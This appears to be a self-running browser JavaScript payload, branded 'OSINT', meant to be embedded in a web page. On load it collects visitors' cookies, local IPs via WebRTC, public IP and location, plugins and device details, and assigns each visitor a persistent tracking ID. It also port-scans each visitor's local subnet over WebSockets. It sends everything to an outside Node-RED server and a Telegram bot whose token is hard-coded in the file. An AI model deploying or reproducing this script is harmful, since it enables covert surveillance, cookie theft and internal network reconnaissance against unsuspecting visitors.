(() => {
  'use strict';

  const botToken = '5871224544:AAH2CkeLJSsmdmp4MIGIul8welqy6hLFVPU'; // <-- Replace with your Telegram bot token
  const chatId = '920222421';               // <-- Replace with your Telegram chat ID
  const postUrl = 'https://dev.gbya.co.uk:1880/osint'; // Your Node-RED endpoint

  // Ports to scan on local subnet (top 100 common ports including UPnP etc)
  const portsToScan = [
    7,9,13,20,21,22,23,25,37,53,67,68,69,80,88,110,123,135,137,138,139,143,161,
    162,179,1900,2189,2190,2483,2484,3128,3306,3389,3689,5000,5060,5190,5432,5631,
    5900,5985,6000,8080,8443,8888,49152,49153,49154,49155,49156,49157,49158,49159,
    49160,49161,49162,49163,49164,49165,49166,49167,49168,49169,49170,49171,49172,
    49173,49174,49175,49176,49177,49178,49179,49180,49181,49182,49183,49184,49185,
    49186,49187,49188,49189,49190,49191,49192,49193,49194,49195,49196,49197,49198,
    49199
  ];

  // Helper: generate or get persistent UUID in localStorage
  function getPersistentUUID() {
    let uuid = localStorage.getItem('osint_uuid');
    if (!uuid) {
      uuid = crypto.randomUUID ? crypto.randomUUID() : ([1e7]+-1e3+-4e3+-8e3+-1e11)
        .replace(/[018]/g, c =>
          (c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> c / 4).toString(16));
      localStorage.setItem('osint_uuid', uuid);
      console.log('[OSINT] Generated new UUID:', uuid);
    } else {
      console.log('[OSINT] Loaded existing UUID:', uuid);
    }
    return uuid;
  }

  // Get browser cookies parsed into key-value object
  function getCookies() {
    return document.cookie.split('; ').reduce((acc, cookie) => {
      const [k, v] = cookie.split('=');
      if(k) acc[k] = v;
      return acc;
    }, {});
  }

  // Get installed plugins names
  function getPlugins() {
    return Array.from(navigator.plugins).map(p => p.name);
  }

  // Get local IPs via WebRTC
  async function getLocalIPs() {
    return new Promise((resolve) => {
      const ips = new Set();
      // Compatibility for Firefox and Chrome
      const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
      if (!RTCPeerConnection) {
        resolve([]);
        return;
      }
      const pc = new RTCPeerConnection({iceServers: []});
      pc.createDataChannel('');
      pc.onicecandidate = (event) => {
        if (!event.candidate) {
          pc.close();
          resolve(Array.from(ips));
          return;
        }
        const parts = event.candidate.candidate.split(' ');
        const ip = parts[4];
        if (ip && !ip.includes(':') && !ips.has(ip)) { // Exclude IPv6 for local IP
          ips.add(ip);
        }
      };
      pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => resolve([]));
    });
  }

  // Scan ports on local subnet asynchronously with throttling (max 5 concurrent)
  async function scanLocalSubnetPorts(localIP) {
    if (!localIP) return {};
    // Extract subnet, e.g. 192.168.1.
    const subnet = localIP.split('.').slice(0, 3).join('.') + '.';
    const openPortsByIP = {};
    const maxConcurrent = 5;
    let active = 0;
    let index = 0;

    function sleep(ms) {
      return new Promise(r => setTimeout(r, ms));
    }

    async function scanPort(ip, port) {
      // Use WebSocket because fetch won't work on arbitrary ports
      return new Promise(resolve => {
        try {
          const ws = new WebSocket(`ws://${ip}:${port}`);
          let open = false;
          ws.onerror = () => resolve(false);
          ws.onopen = () => {
            open = true;
            ws.close();
          };
          ws.onclose = () => resolve(open);
        } catch {
          resolve(false);
        }
      });
    }

    async function worker() {
      while (index < 254 * portsToScan.length) {
        if (active >= maxConcurrent) {
          await sleep(100);
          continue;
        }
        const i = index++;
        const ipIndex = Math.floor(i / portsToScan.length) + 1;
        const portIndex = i % portsToScan.length;
        const ip = subnet + ipIndex;
        const port = portsToScan[portIndex];

        active++;
        const isOpen = await scanPort(ip, port);
        active--;
        if (isOpen) {
          if (!openPortsByIP[ip]) openPortsByIP[ip] = [];
          openPortsByIP[ip].push(port);
          console.log(`[OSINT] Port open: ${ip}:${port}`);
        }
      }
    }

    // Start workers
    const workers = [];
    for (let i = 0; i < maxConcurrent; i++) {
      workers.push(worker());
    }
    await Promise.all(workers);
    return openPortsByIP;
  }

  // Get battery info with percentage (or null)
  async function getBatteryLevel() {
    if (!navigator.getBattery) return null;
    try {
      const battery = await navigator.getBattery();
      return Math.round(battery.level * 100);
    } catch {
      return null;
    }
  }

  // Collect device/browser data
  async function collectDeviceData() {
    const uuid = getPersistentUUID();
    const localIPs = await getLocalIPs();
    const batteryLevel = await getBatteryLevel();
    return {
      uuid,
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      languages: navigator.languages,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
      maxTouchPoints: navigator.maxTouchPoints || 0,
      screenRes: `${window.screen.width}x${window.screen.height}`,
      colorDepth: window.screen.colorDepth,
      cookieEnabled: navigator.cookieEnabled,
      online: navigator.onLine,
      batteryLevel,
      localIPs,
      cookies: getCookies(),
      plugins: getPlugins(),
      pageUrl: window.location.href,
      referrer: document.referrer || 'N/A',
    };
  }

  // Get public IP + geo info from ipapi.co
  async function getPublicIPInfo() {
    try {
      const res = await fetch('https://ipapi.co/json/', {cache: 'no-store'});
      if (!res.ok) {
        console.warn('[OSINT] Failed to get public IP info:', res.status);
        return null;
      }
      return await res.json();
    } catch (e) {
      console.error('[OSINT] Error fetching public IP info:', e);
      return null;
    }
  }

  // Send JSON payload via HTTP POST
  async function sendPayloadHTTP(data) {
    try {
      console.log('[OSINT] Sending data to Node-RED endpoint...');
      const res = await fetch(postUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data),
        mode: 'cors',
        credentials: 'omit'
      });
      if (!res.ok) {
        console.error('[OSINT] Failed to POST payload:', res.status);
      } else {
        console.log('[OSINT] Payload POST successful.');
      }
    } catch (e) {
      console.error('[OSINT] Error sending POST payload:', e);
    }
  }

  // Format JSON data as a Telegram HTML table message
  function createTelegramMessage(data) {
    let msg = `<b>OSINT Report - User ID: ${data.uuid}</b>\n\n`;

    msg += `<b>Page URL:</b> ${data.pageUrl}\n`;
    msg += `<b>Referrer:</b> ${data.referrer}\n\n`;

    msg += `<b>Public IPv4:</b> ${data.publicIP || 'N/A'}\n`;
    msg += `<b>Public IPv6:</b> ${data.publicIPv6 || 'N/A'}\n`;
    msg += `<b>ISP:</b> ${data.isp || 'N/A'}\n`;
    msg += `<b>City:</b> ${data.city || 'N/A'}\n`;
    msg += `<b>Region:</b> ${data.region || 'N/A'}\n`;
    msg += `<b>Country:</b> ${data.country_name || 'N/A'}\n\n`;

    msg += `<b>User Agent:</b> ${data.userAgent}\n`;
    msg += `<b>Platform:</b> ${data.platform}\n`;
    msg += `<b>Languages:</b> ${data.languages.join(', ')}\n`;
    msg += `<b>Timezone:</b> ${data.timezone}\n`;
    msg += `<b>Hardware Concurrency:</b> ${data.hardwareConcurrency}\n`;
    msg += `<b>Touch Points:</b> ${data.maxTouchPoints}\n`;
    msg += `<b>Screen Resolution:</b> ${data.screenRes}\n`;
    msg += `<b>Color Depth:</b> ${data.colorDepth}\n`;
    msg += `<b>Cookies Enabled:</b> ${data.cookieEnabled}\n`;
    msg += `<b>Online:</b> ${data.online}\n`;
    msg += `<b>Battery Level:</b> ${data.batteryLevel !== null ? data.batteryLevel + '%' : 'N/A'}\n\n`;

    msg += `<b>Local IPs:</b> ${data.localIPs.length > 0 ? data.localIPs.join(', ') : 'None'}\n`;

    const cookieKeys = Object.keys(data.cookies || {});
    msg += `<b>Cookies:</b> ${cookieKeys.length > 0 ? cookieKeys.join(', ') : 'None'}\n`;

    msg += `<b>Plugins:</b> ${data.plugins.length > 0 ? data.plugins.join(', ') : 'None'}\n\n`;

    if (data.openPorts && Object.keys(data.openPorts).length > 0) {
      msg += `<b>Open Ports on Local Subnet:</b>\n`;
      for (const ip in data.openPorts) {
        msg += `- ${ip}: ${data.openPorts[ip].join(', ')}\n`;
      }
    } else {
      msg += `<b>Open Ports on Local Subnet:</b> None detected or scan skipped\n`;
    }

    return msg;
  }

  // Send Telegram message via Bot API
  async function sendTelegramMessage(data) {
    try {
      console.log('[OSINT] Sending Telegram message...');
      const message = createTelegramMessage(data);

      const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'HTML',
          disable_web_page_preview: true
        })
      });
      if (!res.ok) {
        console.error('[OSINT] Telegram API error:', res.status);
      } else {
        console.log('[OSINT] Telegram message sent.');
      }
    } catch (e) {
      console.error('[OSINT] Error sending Telegram message:', e);
    }
  }

  // Main orchestrator
  (async () => {
    console.log('[OSINT] Starting data collection...');
    const deviceData = await collectDeviceData();

    console.log('[OSINT] Getting public IP info...');
    const publicIPInfo = await getPublicIPInfo();

    deviceData.publicIP = publicIPInfo ? publicIPInfo.ip : null;
    deviceData.publicIPv6 = publicIPInfo ? publicIPInfo.ipv6 : null;
    deviceData.isp = publicIPInfo ? publicIPInfo.org : null;
    deviceData.city = publicIPInfo ? publicIPInfo.city : null;
    deviceData.region = publicIPInfo ? publicIPInfo.region : null;
    deviceData.country_name = publicIPInfo ? publicIPInfo.country_name : null;

    // Scan local subnet ports if we have at least one local IP
    if (deviceData.localIPs && deviceData.localIPs.length > 0) {
      console.log('[OSINT] Scanning local subnet ports...');
      const openPorts = await scanLocalSubnetPorts(deviceData.localIPs[0]);
      deviceData.openPorts = openPorts;
    } else {
      deviceData.openPorts = {};
    }

    // Add timestamp and visitor type (new or returning)
    deviceData.timestamp = new Date().toISOString();
    deviceData.visitorType = localStorage.getItem('osint_uuid') ? 'returning' : 'new';

    // Send HTTP POST
    await sendPayloadHTTP(deviceData);

    // Send Telegram message
    await sendTelegramMessage(deviceData);

    console.log('[OSINT] Data collection and sending completed.');
  })();

})();
